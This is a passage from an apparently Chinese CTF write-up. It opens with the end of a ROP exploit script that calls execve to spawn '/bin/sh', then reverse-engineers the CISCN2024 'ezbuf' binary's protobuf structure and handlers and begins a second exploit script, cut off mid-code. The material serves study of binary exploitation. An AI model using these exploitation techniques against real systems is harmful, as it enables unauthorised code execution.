CG.<span class="hljs-built_in">set_find_area</span>(find_in_elf=True,find_in_libc=False)<br>    p = <span class="hljs-built_in">p64_ex</span>(CG.<span class="hljs-built_in">pop_rdi_ret</span>())+<span class="hljs-built_in">p64_ex</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p64_ex</span>(CG.<span class="hljs-built_in">pop_rsi_ret</span>())+<span class="hljs-built_in">p64_ex</span>(bss)+<span class="hljs-built_in">p64_ex</span>(CG.<span class="hljs-built_in">pop_rdx_ret</span>())+<span class="hljs-built_in">p64_ex</span>(<span class="hljs-number">8</span>)+<span class="hljs-built_in">p64_ex</span>(<span class="hljs-number">0</span>x5A2F10)<br>    p += <span class="hljs-built_in">p64_ex</span>(CG.<span class="hljs-built_in">pop_rdi_ret</span>())+<span class="hljs-built_in">p64_ex</span>(bss)+<span class="hljs-built_in">p64_ex</span>(CG.<span class="hljs-built_in">pop_rsi_ret</span>())+<span class="hljs-built_in">p64_ex</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p64_ex</span>(CG.<span class="hljs-built_in">pop_rdx_ret</span>())+<span class="hljs-built_in">p64_ex</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p64_ex</span>(CG.<span class="hljs-built_in">pop_rax_ret</span>())+<span class="hljs-built_in">p64_ex</span>(<span class="hljs-number">0</span>x3b)+<span class="hljs-built_in">p64_ex</span>(CG.<span class="hljs-built_in">syscall</span>())<br>    payload = <span class="hljs-built_in">bytes</span>(p[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-built_in">print</span>(p)<br>    <span class="hljs-built_in">print</span>(payload)<br>    num = <span class="hljs-built_in">len</span>(payload)<br>    <span class="hljs-built_in">print</span>(num)<br>    i = <span class="hljs-number">0</span><br>    offest = <span class="hljs-number">256</span> + <span class="hljs-number">47</span> + <span class="hljs-number">17</span> +<span class="hljs-number">8</span> <br>    for _ in <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,num):<br>        pay = b<span class="hljs-string">&#x27;&#x27;</span><br>        pp = payload[i:i+<span class="hljs-number">1</span>]<br>        if i &gt; <span class="hljs-built_in">len</span>(payload)-<span class="hljs-number">1</span>:<br>            break<br>        if pp != b<span class="hljs-string">&quot;\x00&quot;</span> and i!=num :<br>            for j in <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,num-i+<span class="hljs-number">1</span>) :<br>                pp_ = payload[i+j:i+<span class="hljs-number">1</span>+j]<br>                if pp_ != b<span class="hljs-string">&quot;\x00&quot;</span> and j!=num-i:<br>                    pp = pp_ + pp<br>                else:<br>                    i += j<br>                    break   <br>            pay = b<span class="hljs-string">&#x27;a&#x27;</span>*(offest+num-i) + pp<br>            <span class="hljs-built_in">send_payload</span>(pay)<br>            i+=<span class="hljs-number">1</span>  <br>        else:<br>            pay = b<span class="hljs-string">&#x27;a&#x27;</span>*(offest+num-i)<br>            <span class="hljs-built_in">send_payload</span>(pay)<br>            i+=<span class="hljs-number">1</span><br>    <span class="hljs-built_in">send_payload</span>()<br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">sl</span>(b<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="CISCN2024-初赛-ezbuf"><a href="#CISCN2024-初赛-ezbuf" class="headerlink" title="CISCN2024 初赛 ezbuf"></a>CISCN2024 初赛 ezbuf</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">void</span> __fastcall __noreturn main(__int64 <span class="hljs-built_in">a1</span>, char **<span class="hljs-built_in">a2</span>, char **<span class="hljs-built_in">a3</span>)<br>&#123;<br>  int <span class="hljs-built_in">v3</span><span class="hljs-comment">; // [rsp+24h] [rbp-Ch]</span><br>  __int64 <span class="hljs-built_in">v4</span><span class="hljs-comment">; // [rsp+28h] [rbp-8h]</span><br><br>  sub_1389(<span class="hljs-built_in">a1</span>, <span class="hljs-built_in">a2</span>, <span class="hljs-built_in">a3</span>)<span class="hljs-comment">;</span><br>  <span class="hljs-meta">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    printf(<span class="hljs-string">&quot;WHAT DO YOU WANT?\n&quot;</span>)<span class="hljs-comment">;</span><br>    <span class="hljs-built_in">v3</span> = read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x200</span>uLL)<span class="hljs-comment">;</span><br>    <span class="hljs-built_in">v4</span> = sub_1C87(<span class="hljs-number">0</span>LL, <span class="hljs-built_in">v3</span>, buf)<span class="hljs-comment">;</span><br>    <span class="hljs-meta">if</span> ( !<span class="hljs-built_in">v4</span> )<br>      break<span class="hljs-comment">;</span><br>    sub_1934(<br>      *(_QWORD *)(<span class="hljs-built_in">v4</span> + <span class="hljs-number">24</span>),<br>      *(_QWORD *)(<span class="hljs-built_in">v4</span> + <span class="hljs-number">32</span>),<br>      *(_QWORD *)(<span class="hljs-built_in">v4</span> + <span class="hljs-number">40</span>),<br>      *(_QWORD *)(<span class="hljs-built_in">v4</span> + <span class="hljs-number">48</span>),<br>      *(_QWORD *)(<span class="hljs-built_in">v4</span> + <span class="hljs-number">56</span>),<br>      *(unsigned int *)(<span class="hljs-built_in">v4</span> + <span class="hljs-number">64</span>))<span class="hljs-comment">;</span><br>    buf = (char *)malloc(<span class="hljs-number">0x200</span>uLL)<span class="hljs-comment">;</span><br>  &#125;<br>  sub_1657()<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看出是在<code>sub_1C87</code>处进行了反序列化</p>
+<p>跟进找到<code>BC60</code>处的一个结构</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">data</span>.rel.ro:<span class="hljs-number">000000000000</span>BC60 dword_BC60      dd <span class="hljs-number">28</span>AAEEF9h            ; DATA XREF: sub_1AFE+<span class="hljs-number">5</span>B↑o<br></code></pre></td></tr></table></figure>
+
+<p>确定这就是<code>ProtobufCMessageDescriptor</code>结构体</p>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-class"><span class="hljs-keyword">data</span>.rel.ro:000000000000BC60 dword_BC60      dd 28AAEEF9h            ; <span class="hljs-type">DATA</span> <span class="hljs-type">XREF</span>: sub_1AFE+5B↑o</span><br>.<span class="hljs-class"><span class="hljs-keyword">data</span>.rel.ro:000000000000BC60                                         ; sub_1B66+17↑o ...</span><br>.<span class="hljs-class"><span class="hljs-keyword">data</span>.rel.ro:000000000000BC64                 db    0</span><br>.<span class="hljs-class"><span class="hljs-keyword">data</span>.rel.ro:000000000000BC65                 db    0</span><br>.<span class="hljs-class"><span class="hljs-keyword">data</span>.rel.ro:000000000000BC66                 db    0</span><br>.<span class="hljs-class"><span class="hljs-keyword">data</span>.rel.ro:000000000000BC67                 db    0</span><br>.<span class="hljs-class"><span class="hljs-keyword">data</span>.rel.ro:000000000000BC68                 dq offset aHeybro       ; &quot;heybro&quot;</span><br>.<span class="hljs-class"><span class="hljs-keyword">data</span>.rel.ro:000000000000BC70                 dq offset aHeybro_0     ; &quot;<span class="hljs-type">Heybro</span>&quot;</span><br>.<span class="hljs-class"><span class="hljs-keyword">data</span>.rel.ro:000000000000BC78                 dq offset aHeybro_0     ; &quot;<span class="hljs-type">Heybro</span>&quot;</span><br>.<span class="hljs-class"><span class="hljs-keyword">data</span>.rel.ro:000000000000BC80                 dq offset unk_910E</span><br>.<span class="hljs-class"><span class="hljs-keyword">data</span>.rel.ro:000000000000BC88                 dq offset qword_48</span><br>.<span class="hljs-class"><span class="hljs-keyword">data</span>.rel.ro:000000000000BC90                 dq 5</span><br>.<span class="hljs-class"><span class="hljs-keyword">data</span>.rel.ro:000000000000BC98                 dq offset off_BAE0      ; &quot;whatcon&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>该结构体有五个字段,第一个字段为 whatcon</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs tap">.data.rel.ro:000000000000BAE0 A0<span class="hljs-number"> 90 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>off_BAE0        dq offset aWhatcon      ; DATA XREF: .data.rel.ro:000000000000BC98↓o<br>.data.rel.ro:000000000000BAE0                                                                 ; &quot;whatcon&quot;<br>.data.rel.ro:000000000000BAE8<span class="hljs-number"> 01 </span>00<span class="hljs-number"> 00 </span>00                             dd 1<br>.data.rel.ro:000000000000BAEC<span class="hljs-number"> 03 </span>00<span class="hljs-number"> 00 </span>00                             dd 3<br>.data.rel.ro:000000000000BAF0 0F<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>                            dd 0Fh<br>.data.rel.ro:000000000000BAF4<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 18 </span>00<span class="hljs-number"> 00 </span>00                 dq 1800000000h<br>.data.rel.ro:000000000000BAFC<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                 dq 0<br>.data.rel.ro:000000000000BB04<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                 dq 0<br>.data.rel.ro:000000000000BB0C<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                             dd 0<br>.data.rel.ro:000000000000BB10<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                 dq 0<br>.data.rel.ro:000000000000BB18<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                 dq 0<br>.data.rel.ro:000000000000BB20<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                 dq 0<br>.data.rel.ro:000000000000BB28 A8<span class="hljs-number"> 90 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>                dq offset aWhattodo     ; &quot;whattodo&quot;<br>.data.rel.ro:000000000000BB30<span class="hljs-number"> 02 </span>00<span class="hljs-number"> 00 </span>00                             dd 2<br>.data.rel.ro:000000000000BB34<span class="hljs-number"> 03 </span>00<span class="hljs-number"> 00 </span>00                             dd 3<br>.data.rel.ro:000000000000BB38<span class="hljs-number"> 04 </span>00<span class="hljs-number"> 00 </span>00                             dd 4<br>.data.rel.ro:000000000000BB3C<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 28 </span>00<span class="hljs-number"> 00 </span>00                 dq 2800000000h<br>.data.rel.ro:000000000000BB44<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                 dq 0<br>.data.rel.ro:000000000000BB4C<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                 dq 0<br>.data.rel.ro:000000000000BB54<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                             dd 0<br>.data.rel.ro:000000000000BB58<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                 dq 0<br>.data.rel.ro:000000000000BB60<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                 dq 0<br>.data.rel.ro:000000000000BB68<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                 dq 0<br>.data.rel.ro:000000000000BB70 B1<span class="hljs-number"> 90 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>                dq offset aWhatidx      ; &quot;whatidx&quot;<br>.data.rel.ro:000000000000BB78<span class="hljs-number"> 03 </span>00<span class="hljs-number"> 00 </span>00                             dd 3<br>.data.rel.ro:000000000000BB7C<span class="hljs-number"> 03 </span>00<span class="hljs-number"> 00 </span>00                             dd 3<br>.data.rel.ro:000000000000BB80<span class="hljs-number"> 04 </span>00<span class="hljs-number"> 00 </span>00                             dd 4<br>.data.rel.ro:000000000000BB84<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 30 </span>00<span class="hljs-number"> 00 </span>00                 dq 3000000000h<br>.data.rel.ro:000000000000BB8C<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                 dq 0<br>.data.rel.ro:000000000000BB94<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                 dq 0<br>.data.rel.ro:000000000000BB9C<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                             dd 0<br>.data.rel.ro:000000000000BBA0<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                 dq 0<br>.data.rel.ro:000000000000BBA8<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                 dq 0<br>.data.rel.ro:000000000000BBB0<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                 dq 0<br>.data.rel.ro:000000000000BBB8 B9<span class="hljs-number"> 90 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>                dq offset aWhatsize     ; &quot;whatsize&quot;<br>.data.rel.ro:000000000000BBC0<span class="hljs-number"> 04 </span>00<span class="hljs-number"> 00 </span>00                             dd 4<br>.data.rel.ro:000000000000BBC4<span class="hljs-number"> 03 </span>00<span class="hljs-number"> 00 </span>00                             dd 3<br>.data.rel.ro:000000000000BBC8<span class="hljs-number"> 04 </span>00<span class="hljs-number"> 00 </span>00                             dd 4<br>.data.rel.ro:000000000000BBCC<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 38 </span>00<span class="hljs-number"> 00 </span>00                 dq 3800000000h<br>.data.rel.ro:000000000000BBD4<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                 dq 0<br>.data.rel.ro:000000000000BBDC<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                 dq 0<br>.data.rel.ro:000000000000BBE4<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                             dd 0<br>.data.rel.ro:000000000000BBE8<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                 dq 0<br>.data.rel.ro:000000000000BBF0<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                 dq 0<br>.data.rel.ro:000000000000BBF8<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                 dq 0<br>.data.rel.ro:000000000000BC00 C2<span class="hljs-number"> 90 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>                dq offset aWhatsthis    ; &quot;whatsthis&quot;<br>.data.rel.ro:000000000000BC08<span class="hljs-number"> 05 </span>00<span class="hljs-number"> 00 </span>00                             dd 5<br>.data.rel.ro:000000000000BC0C<span class="hljs-number"> 03 </span>00<span class="hljs-number"> 00 </span>00                             dd 3<br>.data.rel.ro:000000000000BC10<span class="hljs-number"> 06 </span>00<span class="hljs-number"> 00 </span>00                             dd 6<br>.data.rel.ro:000000000000BC14<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 40 </span>00<span class="hljs-number"> 00 </span>00                 dq 4000000000h<br>.data.rel.ro:000000000000BC1C<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                 dq 0<br>.data.rel.ro:000000000000BC24<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                 dq 0<br>.data.rel.ro:000000000000BC2C<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                             dd 0<br>.data.rel.ro:000000000000BC30<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                 dq 0<br>.data.rel.ro:000000000000BC38<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                 dq 0<br>.data.rel.ro:000000000000BC40<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                 dq 0<br></code></pre></td></tr></table></figure>
+
+<p>得到结构为</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">syntax</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;proto2&quot;</span><span class="hljs-comment">;</span><br>message heybro &#123;<br>	required bytes whatcon <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>	required sint64 whattodo <span class="hljs-operator">=</span> <span class="hljs-number">2</span><span class="hljs-comment">;</span><br>	required sint64 whatidx <span class="hljs-operator">=</span> <span class="hljs-number">3</span><span class="hljs-comment">;</span><br>	required sint64 whatsize <span class="hljs-operator">=</span> <span class="hljs-number">4</span><span class="hljs-comment">;</span><br>	required uint32 whatsthis <span class="hljs-operator">=</span> <span class="hljs-number">5</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>对于</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">Vuln</span>(*(v4 + <span class="hljs-number">24</span>), *(v4 + <span class="hljs-number">32</span>), *(v4 + <span class="hljs-number">40</span>), *(v4 + <span class="hljs-number">48</span>), *(v4 + <span class="hljs-number">56</span>), *(v4 + <span class="hljs-number">64</span>));<span class="hljs-comment">//六个参数</span><br></code></pre></td></tr></table></figure>
+
+<p>是因为</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span>  <span class="hljs-title class_">Heybro</span><br>&#123;<br>  ProtobufCMessage base;<br>  ProtobufCBinaryData whatcon;<br>  <span class="hljs-type">int64_t</span> whattodo;<br>  <span class="hljs-type">int64_t</span> whatidx;<br>  <span class="hljs-type">int64_t</span> whatsize;<br>  <span class="hljs-type">uint32_t</span> whatsthis;<br>&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ProtobufCMessage</span> &#123;<br>	<span class="hljs-comment">/** The descriptor for this message type. */</span><br>	<span class="hljs-type">const</span> ProtobufCMessageDescriptor	*descriptor;<br>	<span class="hljs-comment">/** The number of elements in `unknown_fields`. */</span><br>	<span class="hljs-type">unsigned</span>				n_unknown_fields;<br>	<span class="hljs-comment">/** The fields that weren&#x27;t recognized by the parser. */</span><br>	ProtobufCMessageUnknownField		*unknown_fields;<br>&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ProtobufCBinaryData</span> &#123;<br>	<span class="hljs-type">size_t</span>	len;        <span class="hljs-comment">/**&lt; Number of bytes in the `data` field. */</span><br>	<span class="hljs-type">uint8_t</span>	*data;      <span class="hljs-comment">/**&lt; Data bytes. */</span><br>&#125;;<br><br><br></code></pre></td></tr></table></figure>
+
+<p>所以实际是</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">Vuln</span>(*(<span class="hljs-built_in">v4</span> + <span class="hljs-number">24</span>), *(<span class="hljs-built_in">v4</span> + <span class="hljs-number">32</span>), *(<span class="hljs-built_in">v4</span> + <span class="hljs-number">40</span>), *(<span class="hljs-built_in">v4</span> + <span class="hljs-number">48</span>), *(<span class="hljs-built_in">v4</span> + <span class="hljs-number">56</span>), *(<span class="hljs-built_in">v4</span> + <span class="hljs-number">64</span>))<span class="hljs-comment">;</span><br><span class="hljs-symbol">whatcon.len</span>,whatcon<span class="hljs-meta">.data</span>,whattodo,whatidx,whatsize,whatsthis<br></code></pre></td></tr></table></figure>
+
+<p>在Vuln中</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __fastcall <span class="hljs-title">Vuln</span><span class="hljs-params">(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a6)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>                                                <span class="hljs-comment">// whatcon.len,whatcon.data,whattodo,whatidx,whatsize,whatsthis</span><br>  <span class="hljs-keyword">switch</span> ( a3 )<br>  &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0LL</span>:<br>      result = <span class="hljs-built_in">m_nop</span>();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1LL</span>:<br>      result = <span class="hljs-built_in">add</span>(a4, a1, a2);                 <span class="hljs-comment">// a4-idx,a2_memcpy_0x30_to_chunk</span><br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2LL</span>:<br>      result = <span class="hljs-built_in">del</span>(a4);                         <span class="hljs-comment">// 10次</span><br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3LL</span>:<br>      result = <span class="hljs-built_in">show</span>(a4, a6, a5, a1, a2);        <span class="hljs-comment">// whatidx,whatsthis,whatsize,whatcon.len,whatcon.data;3次</span><br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4LL</span>:<br>      _exit(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">default</span>:<br>      result = <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;what?\n&quot;</span>);<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>libc为2.35</p>
+<p>exp</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs scss">def <span class="hljs-built_in">cmd</span>(whatcon,whattodo,whatidx,whatsize,whatsthis):<br>    p = heybro_pb2.<span class="hljs-built_in">heybro</span>()<br>    p.whatcon = whatcon<br>    p.whattodo = whattodo#switch<br>    p.whatidx = whatidx<br>    p.whatsize = whatsize<br>    p.whatsthis = whatsthis<br>    pp = p.<span class="hljs-built_in">SerializeToString</span>()<br>    <span class="hljs-built_in">sa</span>(<span class="hljs-string">&quot;WHAT DO YOU WANT?\n&quot;</span>,pp)<br>def <span class="hljs-built_in">add</span>(idx,data):<br>    <span class="hljs-built_in">cmd</span>(data,<span class="hljs-number">1</span>,idx,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br>def <span class="hljs-built_in">free</span>(idx):<br>    <span class="hljs-built_in">cmd</span>(b<span class="hljs-string">&#x27;AAAA&#x27;</span>,<span class="hljs-number">2</span>,idx,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br>def <span class="hljs-built_in">show</span>(idx,this,size,data):<br>    <span class="hljs-built_in">cmd</span>(data,<span class="hljs-number">3</span>,idx,size,this)<br>def <span class="hljs-built_in">nop</span>(data):<br>    <span class="hljs-built_in">cmd</span>(data,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br># - - 